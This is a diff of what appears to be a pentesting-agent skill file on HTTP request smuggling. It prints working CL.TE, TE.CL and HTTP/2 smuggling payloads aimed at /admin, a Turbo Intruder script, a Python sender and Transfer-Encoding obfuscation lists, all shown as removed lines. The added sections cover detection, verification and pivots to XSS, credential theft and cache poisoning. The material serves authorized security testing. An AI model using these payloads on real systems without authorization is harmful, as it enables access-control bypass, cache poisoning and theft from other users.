@@ -1,4 +1,4 @@
----
+﻿---
 name: http-smuggling
 description: "HTTP Request Smuggling exploitation covering CL.TE, TE.CL, TE.TE, H2.CL, and H2.TE attack variants"
 category: specialized
@@ -60,16 +60,6 @@ owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
 
 ### Detection Payload Template
 
-```
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 6
-Transfer-Encoding: chunked
-
-0
-
-G
-```
 
 If the server processes this as two separate requests (returns content for `G` as a second request), it is vulnerable to CL.TE.
 
@@ -88,17 +78,6 @@ Content-Length tells the front-end one request size; Transfer-Encoding tells the
 
 ### Payload Construction
 
-```
-POST /endpoint HTTP/1.1
-Host: target.com
-Content-Length: 44
-Transfer-Encoding: chunked
-
-0
-
-SMUGGLED GET /admin HTTP/1.1
-Host: target.com
-```
 
 - Content-Length = 44 (covers everything including the smuggled GET)
 - Transfer-Encoding = chunked, terminates at `0\r\n\r\n`
@@ -106,30 +85,6 @@ Host: target.com
 
 ### Turbo Intruder Setup
 
-```python
-# turbo intruder CL.TE script
-def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                           connectionsPerHost=1,
-                           concurrentConnections=1,
-                           requestsPerConnection=100,
-                           pipeline=False)
-
-    smuggled = 'SMUGGLED GET /admin HTTP/1.1\r\nHost: %s\r\n\r\n' % target.host
-    # 0\r\n\r\n = end of TE chunk
-    cl_value = 5 + 4 + len(smuggled) + 4 + 4  # "0\r\n\r\n" + smuggled + \r\n\r\n
-
-    trigger = 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n%s' % (
-        target.host, cl_value, smuggled)
-
-    engine.queue(trigger, gate='open')
-    engine.openGate('open')
-    engine.iterate()
-
-def handleResponse(req, interesting):
-    if 'admin' in req.response:
-        table.add(req)
-```
 
 ---
 
@@ -146,17 +101,6 @@ Reverse of CL.TE: the front-end processes Transfer-Encoding, the back-end proces
 
 ### Payload
 
-```
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 3
-Transfer-Encoding: chunked
-
-8
-SMUGGLED
-0
-
-```
 
 - TE terminates at `0\r\n\r\n`
 - CL says 3 bytes, but the actual body is much larger
@@ -180,15 +124,6 @@ The goal is to make one device see `Transfer-Encoding: chunked` while the other 
 
 ### Common Tricks
 
-```
-Transfer-Encoding: x chunked
-Transfer-Encoding: chunked, identity
-Transfer-Encoding: chunked\t
-Transfer-Encoding: chunked 
-Transfer-Encoding:\tchunked
-Transfer-Encoding: chunked
-Transfer-Encoding: identity
-```
 
 ### Exploitation
 
@@ -211,20 +146,6 @@ Exploits the mismatch between HTTP/2 framing and HTTP/1.1 header parsing. HTTP/2
 
 ### Payload (via h2 or curl --http2)
 
-```http
-HEADERS:
-  :method: POST
-  :path: /
-  :authority: target.com
-  content-length: 5
-  content-type: text/plain
-
-DATA (length=50):
-0
-
-SMUGGLED GET /admin HTTP/1.1
-Host: target.com
-```
 
 - The `content-length` pseudo-header says 5 bytes
 - The DATA frame contains 50 bytes
@@ -245,20 +166,6 @@ Combines HTTP/2 front-end with TE smuggling on the back-end. Some H2 implementat
 
 ### Payload
 
-```http
-HEADERS:
-  :method: POST
-  :path: /
-  :authority: target.com
-  content-length: 5
-  transfer-encoding: chunked
-
-DATA (length=50):
-0
-
-SMUGGLED GET /admin HTTP/1.1
-Host: target.com
-```
 
 ---
 
@@ -268,73 +175,25 @@ These variations test how different servers and proxies handle ambiguous or malf
 
 ### Standard
 
-```
-Transfer-Encoding: chunked
-Transfer-Encoding: identity
-Transfer-Encoding: chunked, identity
-Transfer-Encoding: identity, chunked
-```
 
 ### Case Variations
 
-```
-Transfer-Encoding: Chunked
-Transfer-Encoding: CHUNKED
-Transfer-Encoding: ChUnKeD
-Transfer-Encoding: cHuNkEd
-```
 
 ### Whitespace Manipulation
 
-```
-Transfer-Encoding:  chunked
-Transfer-Encoding: chunked 
-Transfer-Encoding:  chunked 
-Transfer-Encoding :chunked
-Transfer-Encoding : chunked
-Transfer-Encoding:\tchunked
-Transfer-Encoding:\t chunked
-Transfer-Encoding: chunked\t
-Transfer-Encoding: chunked\t\t
-```
 
 ### Null Bytes and Non-Printable Characters
 
-```
-Transfer-Encoding: chunked\x00
-Transfer-Encoding: chunked\x00\x00
-Transfer-Encoding: \x00chunked
-Transfer-Encoding: chunked\n
-Transfer-Encoding: chunked\r\n
-```
 
 ### Multiple Headers
 
-```
-Transfer-Encoding: chunked
-Transfer-Encoding: identity
-```
 (Some parsers use the first, some use the last, some concatenate)
 
 ### Extended Chunk Extensions
 
-```
-Transfer-Encoding: chunked; x=1
-Transfer-Encoding: chunked;x
-Transfer-Encoding: chunked ;
-Transfer-Encoding: chunked ; x=y
-```
 
 ### Broken Encoding Names
 
-```
-Transfer-Encoding: chunk
-Transfer-Encoding: chunkd
-Transfer-Encoding: chunked1
-Transfer-Encoding: _chunked
-Transfer-Encoding: x-chunked
-Transfer-Encoding: xchunked
-```
 
 ### Validation
 
@@ -392,29 +251,6 @@ Use `httpRequest` to send each variation. Use `compareResponses` to diff the ser
 
 ### Custom Python Scripts
 
-```python
-import http.client
-import ssl
-
-def test_cl_te(host, port, path="/"):
-    payload = (
-        f"POST {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Content-Length: 44\r\n"
-        f"Transfer-Encoding: chunked\r\n"
-        f"\r\n"
-        f"0\r\n"
-        f"\r\n"
-        f"SMUGGLED GET /admin HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"\r\n"
-    )
-    ctx = ssl.create_default_context()
-    conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=10)
-    conn.send(payload.encode())
-    resp = conn.getresponse()
-    return resp.status, resp.read()
-```
 
 ---
 
@@ -429,3 +265,24 @@ def test_cl_te(host, port, path="/"):
 - **Ambiguous header handling varies** — a server that rejects `Transfer-Encoding: chunked` with a 400 error is not vulnerable; one that processes it normally may be
 - **H2 attacks require HTTP/2 support** — verify the front-end accepts H2 with `curl --http2 -I https://target.com` before attempting H2.CL or H2.TE
 - **Do not extrapolate** — if CL.TE works, do not assume TE.CL or H2.CL also works; each variant has independent prerequisites
+
+## Trigger Conditions
+
+Activate when the target sits behind multiple HTTP-processing devices in series — a load balancer, reverse proxy, CDN, or WAF in front of an origin. Also trigger when you observe inconsistent handling of `Content-Length` vs `Transfer-Encoding`, any protocol downgrade (HTTP/2 front-end to HTTP/1.1 back-end), or orphaned/mismatched responses across repeated requests. Do not trigger on single-server origins with no proxy layer or end-to-end HTTP/2 with strict parsing.
+
+## Detection Approach
+
+Establish a baseline first: send a normal request and record status, headers, body, and timing. Then probe ambiguity by sending requests carrying both `Content-Length` and `Transfer-Encoding: chunked`, and measure whether the server stalls waiting for more body (indicates it prioritizes TE) or ignores a short CL. Use `compareResponses` across many repeats to detect differential handling. Work variant-by-variant — CL.TE, then TE.CL, then TE.TE obfuscations, then H2.CL/H2.TE only after confirming H2 support — testing one hypothesis per probe. Confirm a positive by demonstrating that a smuggled prefix produces a *separate* detectable effect in a later response (a 404 for a bogus path, a reflected header, a redirect) rather than mere timing jitter. Pivot to impact chains (XSS injection into others' responses, credential redirect, cache poisoning, internal SSRF) only after the desync is proven.
+
+## Pitfalls
+
+- Treating any timing difference as smuggling — latency, pooling, and processing variance cause noise; require a concrete side effect.
+- Testing multiple variants in one probe — you cannot attribute which variant caused an effect.
+- Assuming H2 attacks work without confirming the front-end speaks HTTP/2.
+- Assuming a 400 on ambiguous headers means safe — strict parsers reject, but others may partially process; also re-test on other routes.
+- Inferring the front/back split incorrectly — guessing CL.TE when it is TE.CL wastes effort; let the differential evidence decide.
+- Forgetting smuggled requests inherit the connection context, not your auth — credential theft needs a victim sharing the back-end connection.
+
+## Verification & Impact
+
+CONFIRMED when a smuggled request demonstrably creates a second processed request/response (observable new status, reflected content, redirect, or 404 for a crafted path) with the exact request bytes captured via `recordEvidence`. SUSPECTED when only timing anomalies exist without a reproduced side effect — record as candidate. Document impact by the proven chain: response/header injection into other users (XSS, credential theft), cache poisoning (persistent content for all users), or internal SSRF reach. Note the specific variant (CL.TE/TE.CL/TE.TE/H2.CL/H2.TE) and the parsing discrepancy that enables it.
